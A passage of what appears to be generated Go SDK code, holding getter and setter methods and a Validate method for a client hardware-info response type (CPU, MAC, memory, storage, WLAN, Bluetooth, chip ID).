func (s *DescribeClientsResponseBodyDataHardwareInfo) GetCpu() *string {
	return s.Cpu
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) GetMac() *string {
	return s.Mac
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) GetMemory() *string {
	return s.Memory
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) GetStorage() *string {
	return s.Storage
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) GetWlan() *string {
	return s.Wlan
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) SetBluetooth(v string) *DescribeClientsResponseBodyDataHardwareInfo {
	s.Bluetooth = &v
	return s
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) SetChipId(v string) *DescribeClientsResponseBodyDataHardwareInfo {
	s.ChipId = &v
	return s
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) SetCpu(v string) *DescribeClientsResponseBodyDataHardwareInfo {
	s.Cpu = &v
	return s
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) SetMac(v string) *DescribeClientsResponseBodyDataHardwareInfo {
	s.Mac = &v
	return s
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) SetMemory(v string) *DescribeClientsResponseBodyDataHardwareInfo {
	s.Memory = &v
	return s
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) SetStorage(v string) *DescribeClientsResponseBodyDataHardwareInfo {
	s.Storage = &v
	return s
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) SetWlan(v string) *DescribeClientsResponseBodyDataHardwareInfo {
	s.Wlan = &v
	return s
}

func (s *DescribeClientsResponseBodyDataHardwareInfo) Validate() error {
	return dara.Validate(s)
}
